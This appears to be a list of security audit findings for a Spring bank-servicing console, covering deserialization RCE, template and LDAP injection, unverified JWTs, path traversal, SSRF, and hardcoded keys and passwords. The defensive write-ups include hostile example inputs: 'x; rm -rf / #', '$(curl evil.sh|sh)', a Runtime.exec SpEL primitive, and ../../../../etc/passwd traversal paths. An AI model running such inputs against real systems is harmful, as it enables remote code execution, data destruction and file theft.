extra.message: adjustFee() parses message.get("rule") (attacker-supplied JSON body field) directly with SpelExpressionParser().parseExpression(...).getValue(ctx) and feeds the result into a BigDecimal. Spring SpEL evaluation of untrusted input is a well-known RCE primitive (e.g. T(java.lang.Runtime).getRuntime().exec(...)), allowing full server compromise by any user holding POLICY_MANAGE.

A static Jackson ObjectMapper has activateDefaultTyping(LaissezFaireSubTypeValidator.instance, NON_FINAL) enabled, then importDrafts() calls DRAFTS.readValue(payload, Object.class) on a customer-supplied string (CustomerController /customers/{id}/financial/drafts, up to 8000 chars). LaissezFaireSubTypeValidator permits instantiation of arbitrary classes via @class/@type markers in the JSON, the classic Jackson polymorphic-deserialization RCE gadget-chain vector.

mapping() calls MAPPINGS.load(feed.mapping()) using the default org.yaml.snakeyaml.Yaml() constructor (no SafeConstructor), on a request body from an unauthenticated endpoint (/partners/** is permitAll in SecurityConfig). SnakeYAML's default loader instantiates arbitrary Java types from '!!' tags in the YAML, enabling remote code execution via known gadget chains.

notice() compiles wording.wording() -- an attacker-controlled field from an unauthenticated request body (/partners/feed/notices is permitAll) -- as a live Handlebars template via NOTICES.compileInline(...).apply(...). This is server-side template injection: Handlebars helpers/partials can be abused to walk the object graph and leak or manipulate server-side state, and the rendered output is stored and later displayed to staff.

cwe: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

extra.message: receive() parses the uploaded JWT with SignedJWT.parse(...) and reads getJWTClaimsSet() directly -- .verify(JWSVerifier) is never called. Any caller of this unauthenticated endpoint (/partners/** permitAll) can forge an unsigned/arbitrary JWT, set claim 'role'='supervisor', and have the note stored with visibility='customer_disclosable', bypassing the intended authorization model.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: message() parses message.receipt() with JWTParser.parse(...) and uses the claims (including 'role') without ever calling verify(). Same unauthenticated forgeable-JWT issue as the /partners/case-referrals endpoint, on the /partners/case-referrals/messages endpoint.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: The LDAP search filter is built by directly concatenating query.uid() (user-controlled JSON field) into the filter string: "(&(objectClass=person)(uid="+query.uid()+"))". An attacker can inject filter metacharacters (e.g. '*)(objectClass=*' or '*)(|(uid=*') to alter query logic and enumerate/exfiltrate arbitrary directory entries.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query

extra.message: dispatch() builds a shell command with new ProcessBuilder("sh","-c","lp -d "+printer+" "+doc).start(), where printer comes straight from the client-controlled BRANCH_PRINTER cookie (set via the unvalidated printerPreference() endpoint, @RequestParam String printer with no pattern constraint). An attacker can set a cookie like 'x; rm -rf / #' or '$(curl evil.sh|sh)' to execute arbitrary OS commands.

print() builds an HTML response by concatenating the unvalidated 'note' query parameter directly into the body: "

Print note: "+note+"

", returned with MediaType.TEXT_HTML and no escaping. A request to /requests/{id}/print?note= reflects attacker HTML/JS into the authenticated session.

open() loads any ServiceRequest via requests.findById(id).orElseThrow() with no call to AuthorizationService.require(...) at all -- unlike RequestService.get() (used elsewhere) which enforces REQUEST_MANAGE scoped to the request's owning branch. Any authenticated user, regardless of branch/role, can open a workspace cookie for any case id across the whole bank, and the issued CASE_WORKSPACE cookie value is a predictable sequential 'CASE-N' token, making the ids easy to guess as well.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: statement() resolves statementDir.resolve(statementRef) (a raw @PathVariable) and reads it with Files.readString with no normalize()/startsWith(base) containment check (contrast with FileStorageService.download(), which does canonicalize and check). A path like ../../../../etc/passwd traverses outside the statement directory.

statementView() resolves statementDir.resolve(last) where 'last' comes directly from the client-controlled STATEMENT_VIEW cookie, with no path containment check, then streams the file back to the client. An attacker can set the cookie to an arbitrary relative path (e.g. ../../../../etc/passwd) to read any file readable by the process.

archive() builds Path target=base.resolve(name) using the client-supplied original filename with no .normalize()/startsWith(base) containment check, unlike store()/attach() in the same class which both validate target.startsWith(base). A crafted filename such as '../../../../etc/cron.d/evil' lets an authenticated user write/overwrite arbitrary files outside the upload directory (CREATE + TRUNCATE_EXISTING).

escalation() takes a free-form 'endpoint' string param and immediately issues an outbound POST to it via routes.post().uri(java.net.URI.create(endpoint))..., with no allowlist/host validation, leaking the current policyCeiling to attacker-chosen hosts (including internal/cloud-metadata addresses). The same stored endpoint is later reused by WorkflowJobs to POST financial-request data on a schedule, compounding the exfiltration risk.

AES-CBC key and IV are both hardcoded literal byte arrays ('NorthstarAgencyK' / 'NorthstarAgencyV') baked into the class. Anyone with source access can decrypt/forge any agency-referral envelope; the static IV also means identical plaintexts always produce identical ciphertext, leaking structure.

cwe: CWE-321: Use of Hard-coded Cryptographic Key

extra.message: AES-CBC key and IV are both hardcoded literal byte arrays ('NorthstarCaseKey' / 'NorthstarCaseIV0'). Anyone with source access can decrypt or forge the CASE_CONTEXT cookie value used by /case-context, and the fixed IV makes ciphertexts deterministic.

cwe: CWE-321: Use of Hard-coded Cryptographic Key

extra.message: CORS mapping for /api/customers/** allows any origin (allowedOriginPatterns("*")) together with allowCredentials(true). Any website can issue credentialed (cookie-bearing) XHR/fetch requests to the typeahead/summary customer endpoints and read the JSON response, exfiltrating customer PII cross-origin using the victim's authenticated session.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: management.endpoints.web.exposure.include is set to '*' with enabled-by-default:true, and the actuator is served on a separate management.server.port (8090). The app's Spring Security chain (SecurityConfig, denyAll on /actuator/**) is bound to the main server port/context and does not protect a separate management port, so sensitive endpoints like /actuator/env and /actuator/heapdump are reachable without authentication on 8090, potentially leaking DB_PASSWORD/INTERNAL_CLIENT_SECRET/TOKEN_SECRET and full heap contents.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: server.servlet.session.cookie.http-only is explicitly set to false for the SERVICING_SESSION cookie, so JavaScript can read document.cookie. Combined with the reflected XSS in RequestController.print(), this lets an XSS payload steal the live session cookie instead of being blocked by HttpOnly.

app.token-secret falls back to the literal default 'local-development-signing-key-change-me-32chars' when TOKEN_SECRET is unset. This key HMAC-signs every entitlement/session token (TokenService.sign). If deployed without overriding the env var, anyone who reads this public default from source can forge valid staff tokens for any employee/role.

updateContact() logs the customer's old and new phone number and email address in plaintext at INFO level: LOG.info("Contact details for {} changed from {} / {} to {} / {}", ...). Combined with logging.level.root: DEBUG in application.yml, this writes customer PII into application logs.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: notices() builds notices.csv by concatenating Outbox fields (recipient, subject, body) with no escaping of leading '=', '+', '-', '@' characters. The recipient/body values originate from Notification rows that PartnerFeedController (an unauthenticated endpoint) lets an attacker fully control via Handlebars/YAML payloads, so a crafted value opened later in Excel by AUDIT_EXPORT staff can trigger formula execution.

cwe: CWE-1236: Improper Neutralization of Formula Elements in a CSV File

extra.message: dutyOfficer() seeds a SECURITY_ADMIN-role account (EMP900, duty.manager@northstar.test) with the hardcoded literal password 'DutyDesk#2026' encoded via BCrypt on every startup if absent. Anyone reading the source obtains valid credentials for a top-privilege account.

headers(x->x.frameOptions(f->f.disable())) removes the X-Frame-Options protection for the whole console, allowing the authenticated servicing console to be embedded in an attacker's iframe for clickjacking attacks.

cwe: CWE-1021: Improper Restriction of Rendered UI Layers or Frames
